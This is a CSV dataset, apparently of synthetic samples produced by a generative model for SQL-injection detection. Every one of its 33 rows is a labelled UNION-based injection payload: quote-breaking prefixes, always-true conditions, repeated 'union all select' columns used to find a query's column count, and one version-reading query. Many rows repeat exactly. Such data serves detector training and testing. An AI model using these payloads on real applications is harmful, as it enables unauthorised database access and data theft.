id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance
CTGAN_000001,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000086,5.132044805422425
CTGAN_000002,attack,union,"-6020'+  (  select isrz where 2489  =  2489 union all select 2489,2489,2489,2489,2489,2489,2489,2489--",nearest_attack_euclidean,R000147,5.734903359835618
CTGAN_000003,attack,union,"-6200'   )    )    as jjpz where 4490  =  4490 union all select 4490,4490,4490,4490,4490,4490,4490,4490,4490,4490--",nearest_attack_euclidean,R000101,8.394588972079294
CTGAN_000004,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000086,5.76101342707505
CTGAN_000005,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000092,5.650526546553261
CTGAN_000006,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R000092,5.272951736596617
CTGAN_000007,attack,union,"-2384'||  (  select 'vhcp' from dual where 1266  =  1266 union all select 1266,1266,1266,1266--",nearest_attack_euclidean,R000096,6.608284031303798
CTGAN_000008,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000152,7.3793407839649605
CTGAN_000009,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000058,6.918410336883858
CTGAN_000010,attack,union,"-5624' union all select 3723,3723,3723,3723,3723--",nearest_attack_euclidean,R000140,6.5424293291378826
CTGAN_000011,attack,union,"-3879' union all select 9814,9814,9814,9814,9814,9814,9814,9814,9814--",nearest_attack_euclidean,R000058,7.936037104736588
CTGAN_000012,attack,union,"-9574'  )   as rxym where 4719  =  4719 union all select 4719,4719,4719,4719,4719,4719,4719--",nearest_attack_euclidean,R000074,6.3096619257744955
CTGAN_000013,attack,union,"-8325   )    )    as ajxq where 6630  =  6630 union all select 6630,6630,6630,6630,6630,6630--",nearest_attack_euclidean,R000095,5.592774804304698
CTGAN_000014,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R000050,8.287454362356614
CTGAN_000015,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,6.126964037596275
CTGAN_000016,attack,union,"-5217'||  (  select 'juen' from dual where 7336  =  7336 union all select 7336,7336,7336--",nearest_attack_euclidean,R000054,8.088529465425522
CTGAN_000017,attack,union," select * from users where id  =  '1' + @ 1! union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000037,6.7548758240665405
CTGAN_000018,attack,union,"-5998""  )   as gazd where 2814  =  2814 union all select 2814,2814,2814,2814,2814,2814,2814--",nearest_attack_euclidean,R000137,7.3501197546593975
CTGAN_000019,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,8.18402094510702
CTGAN_000020,attack,union,"-3009'+  (  select 'gqbo' where 6915  =  6915 union all select 6915,6915--",nearest_attack_euclidean,R000108,5.6695079744923484
CTGAN_000021,attack,union,"-3226'||  (  select 'ykdw' where 2617  =  2617 union all select 2617,2617--",nearest_attack_euclidean,R000152,5.816259480581252
CTGAN_000022,attack,union,"-5866'   )    )    as phzq where 3803  =  3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--",nearest_attack_euclidean,R000075,7.151852513581809
CTGAN_000023,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,6.660078472390525
CTGAN_000024,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000086,5.6296375355890325
CTGAN_000025,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,6.183171521101629
CTGAN_000026,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R000131,6.33674356759427
CTGAN_000027,attack,union,"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",nearest_attack_euclidean,R000103,6.078007483724314
CTGAN_000028,attack,union,"-7032'  )   as xmmm where 5635  =  5635 union all select 5635,5635,5635,5635,5635--",nearest_attack_euclidean,R000090,6.198987400007626
CTGAN_000029,attack,union,"-1487""  )   as crfi where 2407  =  2407 union all select 2407,2407,2407,2407,2407,2407,2407,2407,2407,2407--",nearest_attack_euclidean,R000091,8.035354316639447
CTGAN_000030,attack,union,"-5866'   )    )    as phzq where 3803  =  3803 union all select 3803,3803,3803,3803,3803,3803,3803,3803--",nearest_attack_euclidean,R000075,5.837745468576499
CTGAN_000031,attack,union,"-7564'  )   as nank where 8095  =  8095 union all select 8095,8095,8095--",nearest_attack_euclidean,R000086,6.447252760778813
CTGAN_000032,attack,union,"-2085""  )   as hkev where 7730  =  7730 union all select 7730,7730--",nearest_attack_euclidean,R000059,6.167744189308516
CTGAN_000033,attack,union,-4058  )   union all select 9184--,nearest_attack_euclidean,R000079,5.094185200904821
